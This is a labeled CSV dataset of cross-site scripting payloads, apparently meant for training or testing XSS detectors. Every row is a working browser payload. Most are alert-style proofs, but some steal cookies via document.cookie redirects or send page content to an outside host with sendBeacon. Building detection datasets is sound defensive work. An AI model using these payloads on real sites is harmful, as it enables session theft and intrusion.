payload,context,technique,severity,length,source
"<u onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,63,real
"""`'><script>\xE2\x80\x89javascript:alert(8844)</script>",script_injection,none,medium,55,real
"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></video>",event_handler,none,medium,114,real
"<mark onclick=""alert(1)"">AnonKryptiQuz</mark>",event_handler,none,medium,45,real
i.contentWindow.alert(1);,dom_sink,none,medium,25,real
"<BGSOUND SRC=""javascript:alert(5993);"">",js_uri,case_variation,medium,39,real
"<svg onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,64,synthetic
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>",script_injection,none,medium,97,real
"<samp onmouseover=""alert(1)"">AnonKryptiQuz</samp>",event_handler,none,medium,49,real
<button popovertarget=x>Click me</button><noscript ontoggle=alert(1) popover id=x>AnonKryptiQuz</noscript>,event_handler,none,medium,106,real
<h1 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,56,real
"<input onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</input>",event_handler,none,medium,69,real
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=print()></img>",event_handler,none,low,123,real
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",js_uri,none,medium,64,real
<script>/*/\u0061lert(1)</script>,script_injection,synthetic,medium,33,synthetic
<button popovertarget=x>Click me</button><audio2 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</audio2>,event_handler,none,medium,108,real
"<input3 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></input3>",event_handler,none,medium,88,real
"<source oncut=""alert(1)"" contenteditable>AnonKryptiQuz</source>",event_handler,none,medium,63,real
"<mark draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,85,real
"<li style=list-style:url() onerror=javascript:alert(3719)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(3719)></div>",event_handler,url_encoding,medium,169,real
"<dl onclick=""alert(1)"">AnonKryptiQuz</dl>",event_handler,none,medium,41,real
&#X00003c,generic,html_entity,low,9,real
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,event_handler,none,medium,56,real
"""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",event_handler,none,medium,50,real
<button popovertarget=x>Click me</button><video ontoggle=alert(1) popover id=x>AnonKryptiQuz</video>,event_handler,none,medium,100,real
"<video onmouseover=""alert(1)"">AnonKryptiQuz</video>",event_handler,none,medium,51,real
\'-alert()//,generic,none,medium,12,real
%22 onload=console.log(document.domain) %22,attribute_escape,synthetic,medium,43,synthetic
j&#97;v&#97;script:void(&#97;l&#101;rt(1)),js_uri,synthetic,medium,42,synthetic
<svg ontoggl&#101;=&#97;l&#101;rt(1)>,tag_injection,synthetic,medium,37,synthetic
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionend=alert(1)></style>",event_handler,none,medium,108,real
"<tfoot onmouseup=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,49,real
%22><svg onfocus=console.log(1)>,tag_injection,synthetic,medium,32,synthetic
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",script_injection,none,medium,104,real
<svg><cite onload=alert(1)></cite>,event_handler,none,medium,34,real
<menuitem contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,62,real
"<svg onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,67,synthetic
"""><svg onmouseover=confirm(location.hash)>",tag_injection,synthetic,medium,42,synthetic
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationstart=""alert(1)""></figcaption>",event_handler,none,medium,107,real
' onload=confirm(document.cookie) ',attribute_escape,synthetic,medium,35,synthetic
"<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>",script_injection,url_encoding,medium,426,real
"<q onmousemove=""alert(1)"">AnonKryptiQuz</q>",event_handler,none,medium,43,real
"<command oncut=""alert(1)"" contenteditable>AnonKryptiQuz</command>",event_handler,none,medium,65,real
"<applet draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",event_handler,none,medium,90,real
<kbd onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</kbd><input value=clickme>,event_handler,none,medium,106,real
<iframe2 onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,69,real
"<thead draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</thead>",event_handler,none,medium,68,real
"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
<option onpointerout=alert(1) style=display:block>AnonKryptiQuz</option>,event_handler,none,medium,72,real
<svgonload=alert(1)>,event_handler,none,medium,24,real
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></head>",event_handler,none,medium,112,real
"<map draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,64,real
"""%3E%3Csvg onmouseover=console.log(1)%3E",tag_injection,synthetic,medium,40,synthetic
<li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>,event_handler,none,medium,69,real
"<noframes oncut=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",event_handler,none,medium,67,real
"<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",event_handler,none,low,99,real
<button popovertarget=x>Click me</button><content ontoggle=alert(1) popover id=x>AnonKryptiQuz</content>,event_handler,none,medium,104,real
"<video2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></video2>",event_handler,none,medium,285,real
<script>//consol&#101;.log(loc&#97;tion.h&#97;sh)</script>,script_injection,synthetic,medium,58,synthetic
<param id=x tabindex=1 onbeforeactivate=alert(1)></param>,event_handler,none,medium,57,real
"<font oncut=""alert(1)"" contenteditable>AnonKryptiQuz</font>",event_handler,none,medium,59,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>"")",dom_sink,synthetic,medium,95,synthetic
<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,event_handler,none,medium,82,real
javascript://%250Alert(document.location=document.cookie),js_uri,url_encoding,high,57,real
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationstart=""alert(1)""></sup>",event_handler,none,medium,93,real
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionend=alert(1)></button>",event_handler,none,medium,110,real
"xss""><!--><svg/onload=alert(document.domain)>",event_handler,none,medium,45,real
%3Cscript%3E/*/console.log('XSS')%3C/script%3E,script_injection,synthetic,medium,46,synthetic
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>",event_handler,none,medium,95,real
"<style>:target {color: red;}</style><section id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></section>",event_handler,none,medium,117,real
"""><svg onfocus=confirm(document.cookie)>",tag_injection,synthetic,medium,40,synthetic
<mark onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,66,real
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,event_handler,none,medium,48,real
<svg%20oNinad=1%20onload=alert(document.cookie)>,event_handler,url_encoding,high,48,real
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1),generic,none,medium,52,real
<summary onpointerleave=alert(1) style=display:block>AnonKryptiQuz</summary>,event_handler,none,medium,76,real
"<div id=""138""><link rel=""import"" href=""AnonKryptiQuz.svg"" />//[""'`-->]]>]</div><div id=""139""><iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />//[""'`-->]]>]</div>undefined",tag_injection,none,low,201,real
""" ontoggle=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,55,synthetic
"<tt oncontextmenu=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,47,real
"<span onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</span>",event_handler,none,medium,65,real
"<form onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</form>",event_handler,none,medium,64,real
"<ruby draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</ruby>",event_handler,none,medium,66,real
"<style>@keyframes x{}</style><keygen style=""animation-name:x"" onwebkitanimationend=""alert(1)""></keygen>",event_handler,none,medium,103,real
"<thead draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",event_handler,none,medium,87,real
J&#97;VasCriPt:ProMpt('XSS'),js_uri,synthetic,medium,28,synthetic
"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",event_handler,none,medium,105,real
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>,event_handler,html_entity,low,119,real
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",generic,html_entity,medium,58,real
<scRipT>cOnsOle.loG(dOcuMenT.cOokIe)</sCriPt>,script_injection,synthetic,medium,45,synthetic
' onfocus=prompt(document.cookie) ',attribute_escape,synthetic,medium,35,synthetic
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",event_handler,none,medium,111,real
"<input type=""image"" src=""javascript:alert('Successful AnonKryptiQuz')"">",js_uri,none,medium,71,real
"<sup onmousedown=""alert(1)"">AnonKryptiQuz</sup>",event_handler,none,medium,47,real
"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></br>",event_handler,none,medium,108,real
"<sub onclick=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,63,real
"<select draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</select>",event_handler,none,medium,70,real
"<style>:target {color:red;}</style><iframe2 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></iframe2>",event_handler,none,medium,118,real
' onerror=console.log('XSS') ',attribute_escape,synthetic,medium,30,synthetic
<xmp onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</xmp><input value=clickme>,event_handler,none,medium,97,real
"<blink oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",event_handler,none,medium,73,real
"""><img src=1 onmouseleave=print()>",event_handler,none,low,34,real
"""><svg onerror=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,57,synthetic
""" onb&#101;gin=&#97;l&#101;rt(1) """,attribute_escape,synthetic,medium,34,synthetic
"<style>:target {color:red;}</style><sub id=x style=""transition:color 1s"" ontransitionend=alert(1)></sub>",event_handler,none,medium,104,real
"<style>@keyframes x{}</style><param style=""animation-name:x"" onwebkitanimationend=""alert(1)""></param>",event_handler,none,medium,101,real
<tt onpointerdown=alert(1) style=display:block>AnonKryptiQuz</tt>,event_handler,none,medium,65,real
<link onfocus=alert(1) id=x tabindex=1 style=display:block>,event_handler,none,medium,59,real
<script>prompt`document.domain`</script>,script_injection,synthetic,medium,40,synthetic
"<big onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</big>",event_handler,none,medium,81,real
""";}(document.writeln(decodeURI(location.hash))-""#<iframe src=javascript:alert(document.domain)",js_uri,none,medium,94,real
<svG oNerRor=prOmpT('XSS')/>,tag_injection,synthetic,medium,28,synthetic
<script>/x/confirm(loc&#97;tion.h&#97;sh)</script>,script_injection,synthetic,medium,50,synthetic
"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",generic,html_entity,medium,54,real
"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,97,real
<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>,event_handler,none,medium,66,real
<script>//prompt('XSS')</script>,script_injection,synthetic,medium,32,synthetic
<img src=x:alert(alt) onerror=eval(src) alt='spyerror'>,event_handler,encoding,high,55,real
"<textarea onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</textarea>",event_handler,none,medium,89,real
<kbd onpointerleave=alert(1) style=display:block>AnonKryptiQuz</kbd>,event_handler,none,medium,68,real
"<noembed onmouseover=""alert(1)"">AnonKryptiQuz</noembed>",event_handler,none,medium,55,real
"<dl onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</dl>",event_handler,none,medium,65,real
<STYLE>@im\port'\ja\vasc\ript:alert(4421)';</STYLE>,attribute_escape,case_variation,medium,51,real
<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>,event_handler,none,medium,66,real
"<image onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,72,real
"<progress onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</progress>",event_handler,none,medium,92,real
<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>,event_handler,none,medium,67,real
"<style>:target {color:red;}</style><link id=x style=""transition:color 1s"" ontransitionstart=alert(1)></link>",event_handler,none,medium,108,real
<head contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
<image2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</image2>,event_handler,none,medium,74,real
<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>,event_handler,none,medium,68,real
"<table onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,71,real
"<strong><button popovertarget=""x"">click me</button><AnonKryptiQuz onbeforetoggle=""alert(document.domain)"" popover id=""x"">aaa</AnonKryptiQuz></strong>",event_handler,none,medium,149,real
"<;DIV STYLE="";width: expression(alert(';XSS';));"";>;",attribute_escape,none,medium,52,real
"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\""&gt;",event_handler,none,medium,99,real
<svG oNmoUseOveR=pRomPt(DocUmeNt.CooKie)>,tag_injection,synthetic,medium,41,synthetic
document.body.innerHTML=('<\000\0i\000mg src=xx:x onerror=confirm(1)>'),event_handler,none,medium,71,real
"<embed onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",event_handler,none,medium,71,real
"<figure onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",event_handler,none,medium,73,real
<img id=x tabindex=1 onactivate=alert(1)></img>,event_handler,none,medium,47,real
<link onpointerup=alert(1) style=display:block>AnonKryptiQuz</link>,event_handler,none,medium,67,real
document.write(%22<img src=x onerror=confirm(1)>%22),dom_sink,synthetic,medium,52,synthetic
"<del onmouseover=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,47,real
"<picture oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,77,real
"<tbody onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</tbody>",event_handler,none,medium,63,real
"<button draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</button>",event_handler,none,medium,85,real
"<ins onmouseenter=""alert(1)"">AnonKryptiQuz</ins>",event_handler,none,medium,48,real
<svg onload=prompt('XSS')>,tag_injection,synthetic,medium,26,synthetic
"<i onmousedown=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,43,real
<header onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<footer draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",event_handler,none,medium,90,real
